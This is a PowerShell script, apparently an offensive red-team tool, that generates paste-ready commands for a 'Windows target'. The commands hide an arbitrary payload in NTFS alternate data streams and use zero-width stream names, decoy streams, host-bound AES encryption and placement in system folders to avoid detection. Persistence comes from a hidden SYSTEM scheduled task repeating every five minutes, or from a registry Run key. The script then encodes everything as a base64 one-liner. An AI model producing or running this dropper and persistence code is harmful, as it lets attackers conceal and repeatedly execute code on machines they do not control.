<#
.SYNOPSIS
    ADS-OneLiner.ps1 - Minimal Command Generator for Windows Targets

.DESCRIPTION
    Runs on Linux (Kali) to generate minimal PowerShell commands for Windows deployment.
    Calls ADS-Dropper.ps1 internally to compute configuration, then outputs only the
    essential commands needed on the Windows target.

    NO full script upload needed - just copy/paste the generated commands.

.PARAMETER Payload
    Payload content (required unless -PayloadAtDeployment)

.PARAMETER PayloadAtDeployment
    Prompt for payload on Windows target instead of baking it in

.PARAMETER ZeroWidthStreams
    Enable zero-width Unicode stream names

.PARAMETER ZeroWidthMode
    'single', 'multi', or 'hybrid'

.PARAMETER HybridPrefix
    Prefix for hybrid mode (e.g., 'Zone.Identifier')

.PARAMETER Persist
    'task', 'registry', 'wmi', or 'none'

.PARAMETER CreateDecoys
    Number of decoy streams (0-10)

.PARAMETER Encrypt
    Enable AES-256 encryption

.PARAMETER Randomize
    Randomize host file name

.PARAMETER OutputFile
    Where to save generated commands (default: ads-payload.txt)

.PARAMETER ManifestDir
    Manifest directory on Linux (default: ./manifests)

.EXAMPLE
    pwsh ADS-OneLiner.ps1 \
      -Payload "Write-Host 'Test'" \
      -ZeroWidthStreams \
      -Persist task

.NOTES
    Author: Qweary
    Version: 2.0.0 (Command Generator)
    Requires: ADS-Dropper.ps1 in ./src/ or same directory
#>

[CmdletBinding()]
param(
    [string]$Payload,
    [switch]$PayloadAtDeployment,
    
    [switch]$ZeroWidthStreams,
    
    [ValidateSet('single', 'multi', 'hybrid')]
    [string]$ZeroWidthMode = 'single',
    
    [string]$HybridPrefix,
    
    [ValidateSet('task', 'registry', 'wmi', 'none')]
    [string]$Persist = 'task',
    
    [ValidateRange(0, 10)]
    [int]$CreateDecoys = 0,
    
    [switch]$Encrypt,
    [switch]$Randomize,
    
    # Deep placement - resolve path on target at runtime
    [switch]$UseDeepPlacement,
    # Attach to existing file on target instead of creating new
    [switch]$AttachToExisting,
    
    # Multi-instance: deploy N independent copies with unique paths/tasks
    [ValidateRange(1, 20)]
    [int]$InstanceCount = 1,
    
    [string]$OutputFile = "ads-payload.txt",
    [string]$ManifestDir = "./manifests"
)

Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║ ADS Minimal Command Generator                         ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan

# Validate payload input
if (-not $Payload -and -not $PayloadAtDeployment) {
    Write-Error "Provide -Payload or use -PayloadAtDeployment"
    exit 1
}

# Locate ADS-Dropper.ps1
$possiblePaths = @(
    (Join-Path $PSScriptRoot 'ADS-Dropper.ps1')
    (Join-Path $PSScriptRoot 'src/ADS-Dropper.ps1')
    './ADS-Dropper.ps1'
    './src/ADS-Dropper.ps1'
)

$adsDropperPath = $null
foreach ($path in $possiblePaths) {
    if (Test-Path $path) {
        $adsDropperPath = $path
        break
    }
}

if (-not $adsDropperPath) {
    Write-Error "ADS-Dropper.ps1 not found. Searched: $($possiblePaths -join ', ')"
    exit 1
}

Write-Host "[*] Using ADS-Dropper: $adsDropperPath" -ForegroundColor Gray

# Call ADS-Dropper.ps1 in GenerateOnly mode to get configuration
Write-Host "[*] Generating configuration..." -ForegroundColor White

$params = @{
    Payload = if ($PayloadAtDeployment) { "PLACEHOLDER" } else { $Payload }
    ZeroWidthStreams = $ZeroWidthStreams
    ZeroWidthMode = $ZeroWidthMode
    Persist = $Persist
    Randomize = $Randomize
    Encrypt = $Encrypt
    CreateDecoys = $CreateDecoys
    UseDeepPlacement = $UseDeepPlacement
    AttachToExisting = $AttachToExisting
    GenerateOnly = $true
}

if ($HybridPrefix) { $params.HybridPrefix = $HybridPrefix }

try {
    $config = & $adsDropperPath @params
} catch {
    Write-Error "Failed to generate configuration: $_"
    exit 1
}

Write-Host "[+] Configuration computed" -ForegroundColor Green
Write-Host "    Host: $($config.HostPath)" -ForegroundColor Gray
Write-Host "    Stream: $($config.StreamNameEscaped)" -ForegroundColor Gray
Write-Host "    Task: $($config.TaskName)" -ForegroundColor Gray
if ($InstanceCount -gt 1) {
    Write-Host "    Instances: $InstanceCount (each gets unique path/stream/task)" -ForegroundColor Yellow
}

# Build minimal Windows commands
Write-Host "[*] Building minimal deployment commands..." -ForegroundColor White

# Helper functions needed on Windows (minimal versions)
$helperFunctions = @'
# Host-derived AES key function
function Get-HostKey {
    $h = @($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber) -join '|'
    [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))
}

# Encrypt function (compact)
function Enc($t,$k) {
    $a=[Security.Cryptography.Aes]::Create()
    $a.Key=$k;$a.GenerateIV()
    $e=$a.CreateEncryptor()
    $p=[Text.Encoding]::UTF8.GetBytes($t)
    $b=$e.TransformFinalBlock($p,0,$p.Length)
    [Convert]::ToBase64String($a.IV+$b)
}

# Decrypt function (compact)
function Dec($d,$k) {
    $b=[Convert]::FromBase64String($d)
    $a=[Security.Cryptography.Aes]::Create()
    $a.Key=$k;$a.IV=$b[0..15]
    $c=$a.CreateDecryptor()
    $t=$b[16..($b.Length-1)]
    $p=$c.TransformFinalBlock($t,0,$t.Length)
    [Text.Encoding]::UTF8.GetString($p)
}

'@

# Start building the minimal command script
$minimalScript = ""

# Add helper functions only if encryption is enabled
if ($Encrypt) {
    $minimalScript += $helperFunctions + "`n"
}

# Configuration variables (fallback defaults — may be overridden per-instance)
$minimalScript += @"
# Configuration (fallback values)
`$_hp0='$($config.HostPath)'
`$_sn0=$($config.StreamNameEscaped)
`$_tn0='$($config.TaskName)'

"@

# Payload handling (computed ONCE, before any loop)
if ($PayloadAtDeployment) {
    $minimalScript += @"
# Payload input
Write-Host 'Enter payload (press Enter twice when done):' -ForegroundColor Cyan
`$lines=@()
do{`$line=Read-Host;if(`$line){`$lines+=`$line}}while(`$line)
`$pl=`$lines-join"`n"

"@
} else {
    # Determine if payload is file path or direct content
    $actualPayload = $Payload
    
    # Check if payload looks like a file path (doesn't contain newlines and is a valid path)
    if (($Payload -notmatch "`n") -and (Test-Path $Payload -ErrorAction SilentlyContinue)) {
        Write-Host "[*] File detected: $Payload" -ForegroundColor Yellow
        Write-Host "[*] Reading file contents..." -ForegroundColor Yellow
        try {
            $actualPayload = Get-Content $Payload -Raw -ErrorAction Stop
            Write-Host "[+] Successfully read $($actualPayload.Length) characters" -ForegroundColor Green
        } catch {
            Write-Error "Failed to read file: $_"
            exit 1
        }
    }
    
    # Escape the payload for embedding
    $escapedPayload = $actualPayload -replace "'","''" -replace '`','``'
    $minimalScript += @"
# Payload
`$pl='$escapedPayload'

"@
}

# Encryption handling (computed ONCE)
if ($Encrypt) {
    $minimalScript += @"
# Encrypt payload
`$k=Get-HostKey
`$pl=Enc `$pl `$k

"@
}

# ============================================================
# DEPLOYMENT SECTION
# ============================================================

# Helper: deep placement directory list (shared by both paths)
$deepDirsBlock = @'
$_deepDirs = @(
    "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
    "$env:ProgramData\Microsoft\Windows\WER\Temp",
    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
    "$env:WINDIR\Temp",
    "$env:ProgramData\Microsoft\Diagnosis",
    "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics",
    "$env:ProgramData\Microsoft\Network\Downloader"
)
$_validDirs = $_deepDirs | Where-Object { Test-Path $_ }
'@

# Helper: attach-to-existing logic
$attachBlock = @'
$_found = $false
foreach ($_dir in ($_validDirs | Get-Random -Count ([Math]::Min(3, $_validDirs.Count)))) {
    $_candidate = Get-ChildItem -Path $_dir -File -EA 0 |
        Where-Object { $_.Length -gt 0 -and $_.Length -lt 5MB } |
        Select-Object -First 10 | Get-Random
    if ($_candidate) {
        $hp = $_candidate.FullName
        $_found = $true
        break
    }
}
'@

# Helper: deep placement new-file logic
$deepNewFileBlock = @'
$_names = @('Report.wer','etl_data.log','WPR_initiated.dat','snapshot.etl','diag_report.xml','cache_entry.dat','qmgr0.dat','aria-debug.log')
$hp = Join-Path ($_validDirs | Get-Random) ($_names | Get-Random)
'@

# Helper function: build the deep placement code for the generated script
function Build-DeepPlacementCode {
    $code = "# Runtime deep placement`n$deepDirsBlock`n"
    if ($AttachToExisting) {
        $code += "$attachBlock`n"
        if ($UseDeepPlacement) {
            $code += "if (-not `$_found -and `$_validDirs) {`n$deepNewFileBlock`n}`n"
        } else {
            $code += "if (-not `$_found -and `$_validDirs) {`n`$hp = Join-Path (`$_validDirs | Get-Random) ('cache_' + [guid]::NewGuid().ToString().Substring(0,6) + '.dat')`n}`n"
        }
    } elseif ($UseDeepPlacement) {
        $code += "if (`$_validDirs) {`n$deepNewFileBlock`n}`n"
    }
    return $code
}

# Helper function: build ADS write + persistence for the generated script
function Build-DeployBlock {
    $block = @"
# Create ADS (ensure parent dir exists)
`$_pd=Split-Path `$hp -Parent;if(`$_pd -and !(Test-Path `$_pd)){ni `$_pd -ItemType Directory -Force|Out-Null}
if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
`$pl|sc "`$hp``:`$sn" -Force

"@

    # Decoys
    if ($CreateDecoys -gt 0) {
        $decoyNames = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
        $decoyContents = @('[ZoneTransfer]`r`nZoneId=3', 'Document summary', 'Internal use only', 'System')
        for ($i = 0; $i -lt [Math]::Min($CreateDecoys, $decoyNames.Count); $i++) {
            $block += "'$($decoyContents[$i])'|sc `"`${hp}:$($decoyNames[$i])`" -Force`n"
        }
        $block += "`n"
    }

    # Persistence
    if ($Persist -eq 'task') {
        if ($Encrypt) {
            $block += @"
`$adsPath=`$hp+':'+`$sn
`$taskCmd='function Get-HostKey{`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join''|'';[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))};function Dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};`$k=Get-HostKey;`$e=Get-Content '''+`$adsPath+''' -Raw;`$p=Dec `$e `$k;IEX `$p'
`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `$taskCmd"
`$t1=New-ScheduledTaskTrigger -AtLogOn
`$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
`$t=@(`$t1,`$t2)
`$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
`$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Principal `$p -Force|Out-Null

"@
        } else {
            $block += @"
`$adsPath=`$hp+':'+`$sn
`$cmd="IEX((Get-Content '`$adsPath' -Raw))"
`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ```"`$cmd```""
`$t1=New-ScheduledTaskTrigger -AtLogOn
`$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
`$t=@(`$t1,`$t2)
`$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
`$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Principal `$p -Force|Out-Null

"@
        }
    } elseif ($Persist -eq 'registry') {
        $block += @"
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"IEX(gc '`$hp``:`$sn' -Raw)`""

"@
    }

    return $block
}

if ($InstanceCount -gt 1) {
    # ============================================================
    # MULTI-INSTANCE PATH
    # ============================================================
    Write-Host "[*] Building multi-instance deployment ($InstanceCount instances)..." -ForegroundColor Yellow

    $minimalScript += @"
# Multi-instance deployment: $InstanceCount independent copies
`$_instanceCount=$InstanceCount
for(`$_i=0;`$_i -lt `$_instanceCount;`$_i++){

# Per-instance: unique stream name and task name
`$sn = -join((65..90)+(97..122)|Get-Random -Count 8|ForEach-Object{[char]`$_})
`$tn = 'WinSAT_' + (-join((65..90)|Get-Random -Count 6|ForEach-Object{[char]`$_}))

"@

    if ($UseDeepPlacement -or $AttachToExisting) {
        $minimalScript += (Build-DeepPlacementCode) + "`n"
    } else {
        # No deep placement — randomize a ProgramData path per instance
        $minimalScript += @'
$hp = Join-Path $env:ProgramData (-join((65..90)+(97..122)|Get-Random -Count 8|ForEach-Object{[char]$_}))

'@
    }

    $minimalScript += Build-DeployBlock

    if (-not $PayloadAtDeployment -and -not $Encrypt) {
        $minimalScript += "IEX `$pl`n"
    }

    $minimalScript += @"
Write-Host "[+] Instance `$(`$_i+1)/$InstanceCount deployed" -ForegroundColor Green
}

"@

} else {
    # ============================================================
    # SINGLE INSTANCE PATH (original behavior + deep placement)
    # ============================================================

    # Use config defaults
    $minimalScript += "`$hp=`$_hp0;`$sn=`$_sn0;`$tn=`$_tn0`n`n"

    if ($UseDeepPlacement -or $AttachToExisting) {
        Write-Host "[*] Adding runtime deep placement logic..." -ForegroundColor Yellow
        $minimalScript += (Build-DeepPlacementCode) + "`n"
    }

    $minimalScript += Build-DeployBlock

    if (-not $PayloadAtDeployment -and -not $Encrypt) {
        $minimalScript += @"
# Execute payload immediately
IEX `$pl

"@
    }
}

$minimalScript += @"
Write-Host '[+] Deployment complete' -ForegroundColor Green
"@

# Base64 encode for one-liner
Write-Host "[*] Encoding for transport..." -ForegroundColor White
$bytes = [System.Text.Encoding]::Unicode.GetBytes($minimalScript)
$encoded = [Convert]::ToBase64String($bytes)

# Save manifest on Linux
if (-not $PayloadAtDeployment) {
    Write-Host "[*] Saving manifest..." -ForegroundColor White
    
    if (-not (Test-Path $ManifestDir)) {
        New-Item -Path $ManifestDir -ItemType Directory -Force | Out-Null
    }
    
    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $manifestFile = Join-Path $ManifestDir "manifest-$timestamp.json"
    
    $payloadHash = (Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($(if ($actualPayload) { $actualPayload } else { $Payload })))) -Algorithm SHA256).Hash
    
    $manifest = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
        HostPath = $config.HostPath
        StreamName = $config.StreamName
        StreamNameEscaped = $config.StreamNameEscaped
        Codepoints = $config.Codepoints
        TaskName = $config.TaskName
        ZeroWidthMode = $ZeroWidthMode
        Persistence = $Persist
        Encrypted = $Encrypt.IsPresent
        DecoysCount = $CreateDecoys
        Randomized = $Randomize.IsPresent
        DeepPlacement = $UseDeepPlacement.IsPresent
        AttachToExisting = $AttachToExisting.IsPresent
        InstanceCount = $InstanceCount
        PayloadHash = $payloadHash
        Operator = $env:USER
        GeneratedOn = hostname
        OutputFile = $OutputFile
    }
    
    $manifest | ConvertTo-Json -Depth 10 | Out-File -FilePath $manifestFile -Encoding UTF8 -Force
    Write-Host "[+] Manifest saved to: $manifestFile" -ForegroundColor Green
}

# Generate output file
Write-Host "[*] Generating output formats..." -ForegroundColor White

$outputContent = @"
╔═══════════════════════════════════════════════════════════╗
║ ADS Minimal Deployment Commands                          ║
║ Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')                         ║
╚═══════════════════════════════════════════════════════════╝

CONFIGURATION:
  Host File: $($config.HostPath)
  Stream Name: $(if($ZeroWidthStreams){'<zero-width> (' + $config.Codepoints + ')'}else{$config.StreamName})
  Task Name: $($config.TaskName)
  Zero-Width Mode: $ZeroWidthMode
  Persistence: $Persist
  Decoys: $CreateDecoys
  Encryption: $($Encrypt.IsPresent)
  Randomized: $($Randomize.IsPresent)
  Deep Placement: $($UseDeepPlacement.IsPresent)
  Attach to Existing: $($AttachToExisting.IsPresent)
  Instances: $InstanceCount$(if($InstanceCount -gt 1){" (each gets unique path/stream/task at runtime)"})
  
PAYLOAD SIZE:
  Readable: $($minimalScript.Length) characters
  Encoded: $($encoded.Length) characters

╔═══════════════════════════════════════════════════════════╗
║ OPTION 1: Base64 Encoded One-Liner (Recommended)         ║
╚═══════════════════════════════════════════════════════════╝

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded

╔═══════════════════════════════════════════════════════════╗
║ OPTION 2: Readable Multi-Line Commands                   ║
╚═══════════════════════════════════════════════════════════╝

$minimalScript

╔═══════════════════════════════════════════════════════════╗
║ USAGE                                                     ║
╚═══════════════════════════════════════════════════════════╝

1. Copy OPTION 1 or OPTION 2
2. Paste into PowerShell on Windows target
3. Press Enter
$(if ($PayloadAtDeployment) { "4. Enter payload when prompted`n5. Press Enter twice to finish" })

╔═══════════════════════════════════════════════════════════╗
║ CLEANUP (use codepoints from manifest)                   ║
╚═══════════════════════════════════════════════════════════╝

# Reconstruct stream name
`$sn=$($config.StreamNameEscaped)

# Remove ADS
Remove-Item "`$(`$hp)``:`$sn" -Force

# Remove task
Unregister-ScheduledTask -TaskName '$($config.TaskName)' -Confirm:`$false

# Remove host file
Remove-Item '$($config.HostPath)' -Force

╔═══════════════════════════════════════════════════════════╗
"@

$outputContent | Out-File -FilePath $OutputFile -Encoding UTF8 -Force

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║ SUMMARY                                                   ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "✓ Minimal commands generated" -ForegroundColor Green
Write-Host "✓ Output saved to: $OutputFile" -ForegroundColor Green
if (-not $PayloadAtDeployment) {
    Write-Host "✓ Manifest saved for recovery" -ForegroundColor Green
}
Write-Host ""
Write-Host "READY TO DEPLOY!" -ForegroundColor Magenta
Write-Host "Copy-paste to Windows target and execute.`n" -ForegroundColor White
